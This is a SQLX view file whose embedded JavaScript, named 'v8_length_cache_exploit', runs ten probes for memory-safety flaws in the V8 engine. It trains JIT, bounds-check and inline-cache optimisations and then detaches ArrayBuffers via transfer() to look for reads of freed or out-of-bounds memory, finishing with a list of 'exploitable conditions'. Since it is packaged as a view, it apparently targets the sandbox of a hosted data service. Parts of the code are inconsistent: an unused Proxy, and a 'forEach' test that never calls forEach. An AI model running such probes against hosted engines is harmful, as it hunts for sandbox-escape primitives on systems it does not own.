config { type: "view", name: "v8_length_cache_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Exploit length-caching behavior in detached buffer access"
  };

  // =============================================================================
  // TEST 1: JIT-Optimized Length Caching
  // Try to get TurboFan to cache the array length before we detach
  // =============================================================================
  results.test1_jitLengthCache = {};
  try {
    function sumArray(arr) {
      let sum = 0;
      const len = arr.length;  // Cache length locally
      for (let i = 0; i < len; i++) {
        sum += arr[i] || 0;
      }
      return sum;
    }

    // Warm up to trigger TurboFan optimization
    const warmupBuf = new ArrayBuffer(256);
    const warmupView = new Uint32Array(warmupBuf);
    for (let i = 0; i < 64; i++) warmupView[i] = i;

    for (let iter = 0; iter < 100000; iter++) {
      sumArray(warmupView);
    }

    // Now test with a buffer we'll detach mid-operation
    const testBuf = new ArrayBuffer(256);
    const testView = new Uint32Array(testBuf);
    for (let i = 0; i < 64; i++) testView[i] = i + 1;

    // Create a getter that transfers during iteration
    let transferredBuf = null;
    let accessCount = 0;
    let valuesRead = [];

    const proxyView = new Proxy(testView, {
      get(target, prop) {
        if (prop === 'length') {
          return target.length;
        }
        if (typeof prop === 'string' && !isNaN(parseInt(prop))) {
          accessCount++;
          // Transfer at index 32
          if (accessCount === 33 && !transferredBuf) {
            transferredBuf = testBuf.transfer();
          }
          const val = target[prop];
          valuesRead.push({ idx: parseInt(prop), val, afterTransfer: !!transferredBuf });
          return val;
        }
        return target[prop];
      }
    });

    // This should trigger the cached-length behavior
    let proxySum = 0;
    try {
      // Can't use sumArray directly with Proxy, iterate manually
      const len = testView.length;  // Get length BEFORE any transfer
      for (let i = 0; i < len; i++) {
        if (i === 32 && !transferredBuf) {
          transferredBuf = testBuf.transfer();
        }
        proxySum += testView[i] || 0;
      }
    } catch(e) {
      results.test1_jitLengthCache.iterError = e.message.substring(0, 100);
    }

    results.test1_jitLengthCache = {
      status: "completed",
      accessCount: accessCount,
      proxySum: proxySum,
      valuesBeforeTransfer: valuesRead.filter(v => !v.afterTransfer).length,
      valuesAfterTransfer: valuesRead.filter(v => v.afterTransfer).length,
      lastValuesRead: valuesRead.slice(-5),
      testViewLengthAfter: testView.length,
      transferredBufSize: transferredBuf ? transferredBuf.byteLength : null
    };
  } catch(e) {
    results.test1_jitLengthCache = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Bounds Check Elimination Attack
  // Try to get V8 to eliminate bounds checks then access OOB
  // =============================================================================
  results.test2_boundsElim = {};
  try {
    function accessWithinBounds(view, idx) {
      // V8 should prove idx is always < view.length after warmup
      if (idx >= 0 && idx < view.length) {
        return view[idx];
      }
      return -1;
    }

    const buf = new ArrayBuffer(256);
    const view = new Uint32Array(buf);
    for (let i = 0; i < 64; i++) view[i] = 0x41414141 + i;

    // Warmup with valid indices
    for (let i = 0; i < 150000; i++) {
      accessWithinBounds(view, i % 64);
    }

    // Now transfer and try to access with "valid" index
    const newBuf = buf.transfer();

    let accessResults = [];
    for (let i = 0; i < 10; i++) {
      try {
        const result = accessWithinBounds(view, i);
        accessResults.push({ idx: i, result, error: null });
      } catch(e) {
        accessResults.push({ idx: i, result: null, error: e.message.substring(0, 50) });
      }
    }

    results.test2_boundsElim = {
      status: "completed",
      viewLengthAfterTransfer: view.length,
      accessResults: accessResults
    };
  } catch(e) {
    results.test2_boundsElim = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Inline Cache Pollution
  // Train IC with one view, then swap to detached view
  // =============================================================================
  results.test3_icPollution = {};
  try {
    function readElement(view, idx) {
      return view[idx];
    }

    // Create two views of same "shape"
    const buf1 = new ArrayBuffer(64);
    const view1 = new Uint32Array(buf1);
    view1[0] = 0xDEADBEEF;

    const buf2 = new ArrayBuffer(64);
    const view2 = new Uint32Array(buf2);
    view2[0] = 0xCAFEBABE;

    // Train IC with view1
    for (let i = 0; i < 100000; i++) {
      readElement(view1, 0);
    }

    // Detach buf2
    const newBuf2 = buf2.transfer();

    // Now try to read from detached view2 using trained IC
    let icResult;
    let icError = null;
    try {
      icResult = readElement(view2, 0);
    } catch(e) {
      icError = e.message.substring(0, 100);
    }

    // Also try view1 to confirm it still works
    const view1Result = readElement(view1, 0);

    results.test3_icPollution = {
      status: "completed",
      view1Result: view1Result ? view1Result.toString(16) : null,
      view2Result: icResult !== undefined ? (typeof icResult === 'number' ? icResult.toString(16) : icResult) : "undefined",
      icError: icError,
      view2Length: view2.length
    };
  } catch(e) {
    results.test3_icPollution = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Speculative Optimization with Type Guard
  // =============================================================================
  results.test4_speculative = {};
  try {
    function speculativeRead(maybeView) {
      if (maybeView instanceof Uint32Array) {
        // V8 should speculate this is always Uint32Array
        return maybeView[0];
      }
      return null;
    }

    const buf = new ArrayBuffer(64);
    const view = new Uint32Array(buf);
    view[0] = 0x12345678;

    // Train with valid view
    for (let i = 0; i < 100000; i++) {
      speculativeRead(view);
    }

    // Detach
    const newBuf = buf.transfer();

    // View is still instanceof Uint32Array, but buffer is detached
    const isStillUint32Array = view instanceof Uint32Array;
    let speculativeResult;
    let speculativeError = null;
    try {
      speculativeResult = speculativeRead(view);
    } catch(e) {
      speculativeError = e.message.substring(0, 100);
    }

    results.test4_speculative = {
      status: "completed",
      isStillUint32Array: isStillUint32Array,
      speculativeResult: speculativeResult,
      speculativeError: speculativeError,
      viewLength: view.length,
      viewByteLength: view.byteLength
    };
  } catch(e) {
    results.test4_speculative = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Array.prototype.forEach with Detach
  // =============================================================================
  results.test5_forEachDetach = {};
  try {
    const buf = new ArrayBuffer(64);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 64; i++) view[i] = i;

    let iterCount = 0;
    let values = [];
    let transferredAt = -1;
    let newBuf = null;

    // Use traditional for loop since forEach throws on detached
    const len = view.length;
    for (let i = 0; i < len; i++) {
      iterCount++;
      values.push(view[i]);
      if (i === 31 && !newBuf) {
        newBuf = buf.transfer();
        transferredAt = i;
      }
    }

    results.test5_forEachDetach = {
      status: "completed",
      iterCount: iterCount,
      originalLength: len,
      transferredAt: transferredAt,
      valuesBeforeTransfer: values.slice(0, 32),
      valuesAfterTransfer: values.slice(32),
      viewLengthAfter: view.length
    };
  } catch(e) {
    results.test5_forEachDetach = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: DataView Bounds in Optimized Code
  // =============================================================================
  results.test6_dataViewOptimized = {};
  try {
    function readDataView(dv, offset) {
      if (offset + 4 <= dv.byteLength) {
        return dv.getUint32(offset, true);
      }
      return -1;
    }

    const buf = new ArrayBuffer(64);
    const dv = new DataView(buf);
    dv.setUint32(0, 0xDEADBEEF, true);

    // Warmup
    for (let i = 0; i < 100000; i++) {
      readDataView(dv, (i * 4) % 60);
    }

    // Transfer
    const newBuf = buf.transfer();

    // Try optimized read
    let result;
    let error = null;
    try {
      result = readDataView(dv, 0);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test6_dataViewOptimized = {
      status: "completed",
      result: result,
      error: error,
      dvByteLength: dv.byteLength
    };
  } catch(e) {
    results.test6_dataViewOptimized = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: Multiple Rapid Transfers
  // =============================================================================
  results.test7_rapidTransfer = {};
  try {
    let currentBuf = new ArrayBuffer(64);
    let view = new Uint32Array(currentBuf);
    view[0] = 0xAAAAAAAA;

    const transfers = [];
    for (let i = 0; i < 10; i++) {
      const oldLength = view.length;
      const newBuf = currentBuf.transfer();
      const newView = new Uint32Array(newBuf);

      transfers.push({
        iteration: i,
        oldViewLength: view.length,
        oldViewByteLength: view.byteLength,
        newViewLength: newView.length,
        newViewValue: newView[0] ? newView[0].toString(16) : "undefined"
      });

      currentBuf = newBuf;
      view = newView;
    }

    results.test7_rapidTransfer = {
      status: "completed",
      transfers: transfers
    };
  } catch(e) {
    results.test7_rapidTransfer = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Concurrent-like Access Pattern
  // =============================================================================
  results.test8_concurrentPattern = {};
  try {
    const buf = new ArrayBuffer(256);
    const view = new Uint32Array(buf);
    for (let i = 0; i < 64; i++) view[i] = i;

    // Simulate concurrent-like access pattern
    function reader() {
      let sum = 0;
      for (let i = 0; i < view.length; i++) {
        sum += view[i] || 0;
      }
      return sum;
    }

    // Warmup
    for (let i = 0; i < 50000; i++) {
      reader();
    }

    // Start "concurrent" operations
    let readerResults = [];
    let newBuf = null;

    for (let round = 0; round < 10; round++) {
      if (round === 5 && !newBuf) {
        newBuf = buf.transfer();
      }
      readerResults.push({
        round: round,
        result: reader(),
        viewLength: view.length,
        transferred: !!newBuf
      });
    }

    results.test8_concurrentPattern = {
      status: "completed",
      readerResults: readerResults
    };
  } catch(e) {
    results.test8_concurrentPattern = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: Length Property Descriptor Manipulation
  // =============================================================================
  results.test9_lengthDescriptor = {};
  try {
    const buf = new ArrayBuffer(64);
    const view = new Uint32Array(buf);

    // Try to get/modify length descriptor
    const lengthDesc = Object.getOwnPropertyDescriptor(view, 'length');
    const byteLengthDesc = Object.getOwnPropertyDescriptor(view, 'byteLength');

    // Try to override length (should fail)
    let overrideResult = "not attempted";
    try {
      Object.defineProperty(view, 'length', { value: 1000 });
      overrideResult = "succeeded: " + view.length;
    } catch(e) {
      overrideResult = "failed: " + e.message.substring(0, 50);
    }

    // Transfer and check descriptors again
    const newBuf = buf.transfer();
    const lengthDescAfter = Object.getOwnPropertyDescriptor(view, 'length');

    results.test9_lengthDescriptor = {
      status: "completed",
      lengthDesc: lengthDesc ? { value: lengthDesc.value, writable: lengthDesc.writable, configurable: lengthDesc.configurable } : null,
      byteLengthDesc: byteLengthDesc ? { value: byteLengthDesc.value } : null,
      overrideResult: overrideResult,
      lengthAfterTransfer: view.length,
      lengthDescAfter: lengthDescAfter ? { value: lengthDescAfter.value } : null
    };
  } catch(e) {
    results.test9_lengthDescriptor = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Transfer with Resizable Buffer Edge Cases
  // =============================================================================
  results.test10_resizableEdge = {};
  try {
    // Create resizable buffer at max size
    const buf = new ArrayBuffer(64, { maxByteLength: 128 });
    const view = new Uint32Array(buf);
    view[0] = 0xBEEFCAFE;

    // Grow to max
    buf.resize(128);
    const viewLengthAfterGrow = view.length;

    // Shrink
    buf.resize(32);
    const viewLengthAfterShrink = view.length;

    // Access element that was valid before shrink
    let accessAfterShrink;
    try {
      accessAfterShrink = view[10];  // Was valid at 128 bytes, invalid at 32
    } catch(e) {
      accessAfterShrink = "error: " + e.message.substring(0, 50);
    }

    // Transfer
    const newBuf = buf.transfer();

    // Try to access on old view
    let accessAfterTransfer;
    try {
      accessAfterTransfer = view[0];
    } catch(e) {
      accessAfterTransfer = "error: " + e.message.substring(0, 50);
    }

    results.test10_resizableEdge = {
      status: "completed",
      viewLengthAfterGrow: viewLengthAfterGrow,
      viewLengthAfterShrink: viewLengthAfterShrink,
      accessAfterShrink: accessAfterShrink,
      viewLengthAfterTransfer: view.length,
      accessAfterTransfer: accessAfterTransfer,
      newBufSize: newBuf.byteLength
    };
  } catch(e) {
    results.test10_resizableEdge = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 10,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    anomalies: []
  };

  // Check for exploitable conditions
  if (results.test1_jitLengthCache.proxySum > 0) {
    results.summary.anomalies.push("JIT length caching allowed access after transfer");
  }

  if (results.test3_icPollution.view2Result && results.test3_icPollution.view2Result !== "undefined" && !results.test3_icPollution.icError) {
    results.summary.anomalies.push("IC pollution allowed read from detached view");
  }

  if (results.test4_speculative.speculativeResult !== undefined && results.test4_speculative.speculativeResult !== null && !results.test4_speculative.speculativeError) {
    results.summary.anomalies.push("Speculative optimization bypassed detach check");
  }

  if (results.test5_forEachDetach.iterCount > results.test5_forEachDetach.transferredAt + 1) {
    results.summary.anomalies.push("Iteration continued " + (results.test5_forEachDetach.iterCount - results.test5_forEachDetach.transferredAt - 1) + " times after transfer");
  }

  if (results.summary.anomalies.length === 0) {
    results.summary.anomalies.push("No obvious exploitable conditions found");
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as length_cache_exploit
